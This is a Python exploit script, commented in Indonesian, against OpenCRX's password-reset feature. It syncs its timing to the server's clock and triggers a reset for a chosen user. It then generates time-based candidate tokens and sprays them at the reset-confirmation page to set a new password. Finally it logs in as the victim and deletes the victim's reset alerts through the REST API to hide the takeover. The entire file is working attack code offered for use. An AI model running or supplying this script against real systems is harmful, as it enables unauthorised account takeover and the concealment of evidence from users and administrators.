import requests, argparse, subprocess, sys, time, base64

parser = argparse.ArgumentParser()
parser.add_argument('-f','--fqdn', help='FQDN dari server OpenCRX', required=True)
parser.add_argument('-u','--user', help='Nama pengguna yang menjadi target', required=True)
parser.add_argument('-p','--password', help='Nilai kata sandi untuk diatur', required=True)
args = parser.parse_args()

proxies = {
    'http':'http://127.0.0.1:8080'
}

print("[-]Memeriksa waktu server untuk penundaan...")
local_delay_check = subprocess.run(["date"], stdout=subprocess.PIPE)
local_time = local_delay_check.stdout.decode('utf-8')
delay_check = requests.get(f"{args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")
server_time = delay_check.headers['Date']
server_time_split = server_time.split(" ")
local_time_split = local_time.split(" ")
server_time_seconds = server_time_split[4].split(":")
local_time_seconds = local_time_split[4].split(":")
delay = int(server_time_seconds[2]) - int(local_time_seconds[2])
minute_delay = int(server_time_seconds[1]) - int(local_time_seconds[1])
if minute_delay != 0:
    delay += minute_delay * 60

print(f"[+] Waktu server: {server_time}\n[+] Waktu lokal: {local_time}[+] Menunda: {delay}")

print("[-] Mengirim permintaan untuk mengatur ulang kata sandi...")
sub = subprocess.run(["date +%s%3N"], stdout=subprocess.PIPE, shell=True)
start_time = sub.stdout.rstrip().decode('utf-8')
if delay < 0:
    print("[-] Mengompensasi perbedaan waktu...")
    time.sleep(delay * -1)
pw_reset = requests.post(f'{args.fqdn}/opencrx-core-CRX/RequestPasswordReset.jsp', data={'id':args.user})
time.sleep(.5)
sub = subprocess.run(["date +%s%3N"], stdout=subprocess.PIPE, shell=True)
stop_time = sub.stdout.rstrip().decode('utf-8')
print(f"[+] Waktu server saat pengaturan ulang kata sandi: {pw_reset.headers['Date']}")
if "Password reset request successful for" not in pw_reset.text:
    print("[!] Ada yang salah! Pastikan Anda memiliki nama pengguna yang ada dan coba lagi")
    sys.exit(2)
if delay > 0:
    print("[-] Mengompensasi perbedaan waktu...")
    time.sleep(delay)
    sub = subprocess.run(["date +%s%3N"], stdout=subprocess.PIPE, shell=True)
    stop_time = sub.stdout.rstrip().decode('utf-8')
print(f"[+] Memulai: {start_time} -- Berhenti: {stop_time}")

print("[-] Membuat daftar token...")
subprocess.run([f"java OpenCRXToken {start_time} {stop_time} > /tmp/tokens.txt"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, shell=True)
test = subprocess.run(["ls /tmp/tokens.txt"], stdout=subprocess.PIPE, shell=True)
if len(test.stdout) < 2:
    print("[!] Tidak dapat membuat daftar token! Pastikan OpenCRXToken.java ada di direktori kerja saat ini dan coba lagi..")
    sys.exit(2)

print("[-] Semprotan token awal...")
f = open("/tmp/tokens.txt", "r")
for token in f:
    data = {
        't':token.rstrip(),
        'p':'CRX',
        's':'Standard',
        'id':args.user,
        'password1':args.password,
        'password2':args.password
    }
    r = requests.post(f"{args.fqdn}/opencrx-core-CRX/PasswordResetConfirm.jsp", data=data)
    response = r.text
    if "Unable to reset password" not in response:
        print(f"[+] Kata sandi berhasil direset! Token = {token.rstrip()}")
        break

print("[-] Mencoba Masuk...")
s = requests.Session()
s.get(f"{args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")
data = {
    "j_username" : args.user,
    "j_password" : args.password
}
s.post(f"{args.fqdn}/opencrx-core-CRX/j_security_check", data=data)
final_login = s.get(f"{args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=en_US&timezone=Europe%2FZurich&initialScale=1&loginFailed=false")
final_url = final_login.text.split("'")[1]
logged_in = s.get(final_url)
if "openCRX -" in logged_in.text and "- Home" in logged_in.text:
    print(f"[+] Login berhasil! Kini Anda memiliki kendali penuh atas akun pengguna!\n[+] Nama Pengguna: {args.user}\n[+] Kata Sandi: {args.password}")
else:
    print(f"[!] Ada yang MUNGKIN salah. Coba masuk secara manual di {args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")
    exit()

print(f"[-] Menunggu server untuk mengejar ketinggalan...")
time.sleep(3)

print("[-] Mencoba mengidentifikasi ID Peringatan Reset Kata Sandi...")

auth_token = f"{args.user}:{args.password}"
auth_token_bytes = auth_token.encode("ascii")

base64_bytes = base64.b64encode(auth_token_bytes)
base64_token = base64_bytes.decode("ascii")

headers = {
    "Accept":"application/json",
    "Authorization":f"Basic {base64_token}"
}

get_alerts = requests.get(f"{args.fqdn}/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/{args.user}/alert", headers=headers, proxies={'http':'http://127.0.0.1:8080'})

alerts = get_alerts.json()
id_list = []

for alert in alerts['objects']:
    xri_list = alert['identity'].split('/')
    length = len(xri_list)
    alert_id = xri_list[length - 1]
    print(f"[+] ID Peringatan diambil melalui API -- {alert_id}")
    id_list.append(alert_id)

print("[-] Mencoba menghapus peringatan...")
for alert in id_list:
    delete_alert = requests.delete(f"{args.fqdn}/opencrx-rest-CRX/org.opencrx.kernel.home1/provider/CRX/segment/Standard/userHome/{args.user}/alert/{alert}", headers=headers)
    if delete_alert.status_code > 199 and delete_alert.status_code < 300:
        print(f"[+] Peringatan {alert} Telah Berhasil dihapus!")
    else:
        print(f"[!] Ada yang salah! Kode Status: {delete_alert.status_code}")

print(f"[+] Eksploitasi Berhasil! Masuk ke sini: {args.fqdn}/opencrx-core-CRX/ObjectInspectorServlet?locale=null?loginFailed=false")